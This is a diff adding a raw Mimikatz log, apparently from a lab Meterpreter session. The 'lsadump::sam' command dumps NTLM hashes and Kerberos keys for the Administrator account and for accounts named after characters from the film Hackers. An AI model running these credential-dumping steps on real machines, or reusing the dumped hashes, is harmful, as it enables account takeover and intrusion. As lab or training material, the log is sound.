@@ -1,0 +1,358 @@
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::sam
+Domain : EN2720-W10-LAZA
+SysKey : 59e7a1c9940dab865bbab3c1bc73f4b4
+Local SID : S-1-5-21-1742023530-4038833925-3247209358
+
+SAMKey : acbe7b0f1aaecbc583de1292b081b54e
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: b26f80138894f9d4803a0d5551db7e05
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e4f56e0f67086a768cfa407dfcba6251
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 6e97a83c4c69d40378063ce0008ed1f90a88c1c07823ea684dab1323b6f65f40
+      aes128_hmac       (4096) : 770520683a04b8ff21da105f9ff8d284
+      des_cbc_md5       (4096) : da686ba2df5bf7e3
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEAdministrator
+    Credentials
+      des_cbc_md5       : da686ba2df5bf7e3
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+
+RID  : 000003e8 (1000)
+User : printer
+  Hash NTLM: c3552433f9a8c458e6e24eb77044e1f3
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : eae5cf48401019f1d899efef46d3bc79
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEprinter
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 16f849df282d2beb3baefc743e44a63e9e7377f9dad8ae9b79f6232a7b4a3822
+      aes128_hmac       (4096) : bc21cb13f8232480afa9bece4be88af0
+      des_cbc_md5       (4096) : 45a41316a20db0da
+    OldCredentials
+      aes256_hmac       (4096) : c1fbd912f9e4604988b26778e221a1f7b08e1d70d9246f895e1bff1a41b8bbbb
+      aes128_hmac       (4096) : 733fe6a494c88c9aa332d8301a60f604
+      des_cbc_md5       (4096) : 236b7acd7fcd25e3
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEprinter
+    Credentials
+      des_cbc_md5       : 45a41316a20db0da
+    OldCredentials
+      des_cbc_md5       : 236b7acd7fcd25e3
+
+
+RID  : 000003ea (1002)
+User : the_plague
+  Hash NTLM: 9869a3c79c4d56478c28e32e2ee51e83
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e5c0d9fecb41a561dd2b2c05bad132e6
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEthe_plague
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 93e6db5adfdb23f4d02a7f8a12e6faba51175b54025350ecef63e6ec8cc6011c
+      aes128_hmac       (4096) : 2a93ef61670f66204670a13a26239337
+      des_cbc_md5       (4096) : 80b9343e4ac7b515
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEthe_plague
+    Credentials
+      des_cbc_md5       : 80b9343e4ac7b515
+
+
+RID  : 000003eb (1003)
+User : hal
+  Hash NTLM: cf3c371727607a8c25f7277f7ecc08d9
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 130b3c790e6b6f4a599d83ffd74f0ea1
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EN2720-W10-LAZARUShal
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8a28e47ec5658d0e6414e0af42a32c657687a2b9fbf40e6744a7f8da9006eadb
+      aes128_hmac       (4096) : 031b3817319ab45eb2528433e6c2efdb
+      des_cbc_md5       (4096) : 23a7f2fe40df024a
+    OldCredentials
+      aes256_hmac       (4096) : 0f6c42089aeacaf10e7992e2b753ba732fbbf11cdba506bfc3b69176c35a9510
+      aes128_hmac       (4096) : dcd48a4e021a6aadf52c5f34cf65a350
+      des_cbc_md5       (4096) : d5ef015e434ae69b
+    OlderCredentials
+      aes256_hmac       (4096) : 961cc7e542a7d5ff244e836255ed6ab2ace4036d375eded31f2ebd2aa7ce118e
+      aes128_hmac       (4096) : 2b4571e8d1c128fa8a88a8ee010deb3a
+      des_cbc_md5       (4096) : ef405de551a80dc1
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EN2720-W10-LAZARUShal
+    Credentials
+      des_cbc_md5       : 23a7f2fe40df024a
+    OldCredentials
+      des_cbc_md5       : d5ef015e434ae69b
+
+
+RID  : 000003ec (1004)
+User : crash_override
+  Hash NTLM: 972cec45b5644e98518a4f86fada8309
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 7e8ea02db33b83dc9cde1bad6978e4f5
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEcrash_override
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 975491e1e273bcfe9609ea7f86d827924900f286994c874bce71daecc26cc72f
+      aes128_hmac       (4096) : 96347fa5fd111223662bd57020597ad6
+      des_cbc_md5       (4096) : 327fd38f5dda5df8
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEcrash_override
+    Credentials
+      des_cbc_md5       : 327fd38f5dda5df8
+
+
+RID  : 000003ed (1005)
+User : acid_burn
+  Hash NTLM: e1e4acda07e8b2189199a1fd49ce95e1
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 802072e8eb0c59f0ee4d25ed8a07e7c9
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EN2720-W10-LAZARUSacid_burn
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 743563ee1121c0d3df2df0602ea0c831ac546309e7b885dd62a6d16189e536f4
+      aes128_hmac       (4096) : 2913e9b556a783750854102116b68d06
+      des_cbc_md5       (4096) : d6ba13f15d762689
+    OldCredentials
+      aes256_hmac       (4096) : eaf061312439704cb8d439e2c95fe115edeb268a1c32ce66f644fb495dfb5671
+      aes128_hmac       (4096) : 502f581455d010bb76c42fdee9eacf9f
+      des_cbc_md5       (4096) : 86ad8c7fe3ce5291
+    OlderCredentials
+      aes256_hmac       (4096) : 8822736ad44a8859e6355101c63af2a22159b4b1626c96dcb2b32233a9b168f2
+      aes128_hmac       (4096) : cae15389b4331cb92c2e8b6b4bc59868
+      des_cbc_md5       (4096) : 43080e52013baedc
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EN2720-W10-LAZARUSacid_burn
+    Credentials
+      des_cbc_md5       : d6ba13f15d762689
+    OldCredentials
+      des_cbc_md5       : 86ad8c7fe3ce5291
+
+
+RID  : 000003ee (1006)
+User : phantom_phreak
+  Hash NTLM: b17076284c521a745d81aafffbe426c5
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 3b750ae678dddb753d22e41d3d01e7e0
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEphantom_phreak
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c0c1c3b9983435c2d64d8730d1f54a924cb78473a075f2ae80a31b0f54597563
+      aes128_hmac       (4096) : 78885c421d6e31726ef80d0f99e3a5b9
+      des_cbc_md5       (4096) : b9a1341f678675cd
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEphantom_phreak
+    Credentials
+      des_cbc_md5       : b9a1341f678675cd
+
+
+RID  : 000003ef (1007)
+User : mr_babbage
+  Hash NTLM: f44a6b845b181591704793073e0d6bb4
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : fbac4f6082b0d791bdca360b05ed0489
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EN2720-W10-LAZARUSmr_babbage
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 59cd9653b355fa4bf62f9a84fc6b763a3ec9ba155faade74cf7926fcdfda51f6
+      aes128_hmac       (4096) : 8aebd6ba72a9afbf0a6e8d9435299383
+      des_cbc_md5       (4096) : 8c387f6dbc3d295e
+    OldCredentials
+      aes256_hmac       (4096) : dd98e7a765147a448a153d6f321ee0fc0b5a7264098945462f6a25df2d794dd9
+      aes128_hmac       (4096) : 517ea7a0b96ef6a91a8b3fb45a796f98
+      des_cbc_md5       (4096) : 1f16c225adcdc461
+    OlderCredentials
+      aes256_hmac       (4096) : 7a10499cddb30b17cb9b8b85b786cb783d2091e208f3c6454ae2b8ec32e32896
+      aes128_hmac       (4096) : d8ccf3630e6242bf3eb3e65eaf59eb71
+      des_cbc_md5       (4096) : a2461c7a2f9df7c2
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EN2720-W10-LAZARUSmr_babbage
+    Credentials
+      des_cbc_md5       : 8c387f6dbc3d295e
+    OldCredentials
+      des_cbc_md5       : 1f16c225adcdc461
+
+
+RID  : 000003f0 (1008)
+User : cereal_killer
+  Hash NTLM: cf9acc13a29ef170fc698b6594a575f4
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 04861dc1d6ee7b87ae7ac3d9af9686fd
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEcereal_killer
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a89b44fcc1f4dbc4096fb9a663178f8cdb7738b0551292bca24a376799abbdfe
+      aes128_hmac       (4096) : 2b85fe8951002b6e626564322084f581
+      des_cbc_md5       (4096) : 01258646e9526d32
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEcereal_killer
+    Credentials
+      des_cbc_md5       : 01258646e9526d32
+
+
+RID  : 000003f1 (1009)
+User : goldstein
+  Hash NTLM: fb9a187494df75923c9515cfca976f08
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : bb5366b01776f602711c8a9676776856
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEgoldstein
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 3ac2c03b7a0b0d0ca04357d0de798c6fd1d1f333b3e4f364c7a59eaaacfb6422
+      aes128_hmac       (4096) : 817c018f42ed4da6e8ae453ab1496339
+      des_cbc_md5       (4096) : 94ba8a4a79e55413
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEgoldstein
+    Credentials
+      des_cbc_md5       : 94ba8a4a79e55413
+
+
+RID  : 000003f2 (1010)
+User : razor
+  Hash NTLM: b26f0337956ecffb4a1fee1631f03b48
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 398c14dc68b25f39803634b401df588a
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGErazor
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 0df6b79377c514d4c80c099eeb96084741c85c9008000947d0f9b5e96165076f
+      aes128_hmac       (4096) : 5836b887aba05fd332fba69110fff9ff
+      des_cbc_md5       (4096) : 75c1babc97f4986b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGErazor
+    Credentials
+      des_cbc_md5       : 75c1babc97f4986b
+
+
+RID  : 000003f3 (1011)
+User : admin
+  Hash NTLM: 209c6174da490caeb422f3fa5a7ae634
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 330e20f00eb66b8469d57ef9ec55442a
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EN2720-W10-LAZARUSadmin
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 9b11611a9317823ea11311b23595cf958e6f17ec15976f419c5fb38945f65ce0
+      aes128_hmac       (4096) : 3d623106f4361139ec9d5220249679dd
+      des_cbc_md5       (4096) : fd830b2a1ac2f215
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EN2720-W10-LAZARUSadmin
+    Credentials
+      des_cbc_md5       : fd830b2a1ac2f215
+
+
+mimikatz # 
+[*] 10.0.2.173 - Meterpreter session 1 closed.  Reason: Died
+
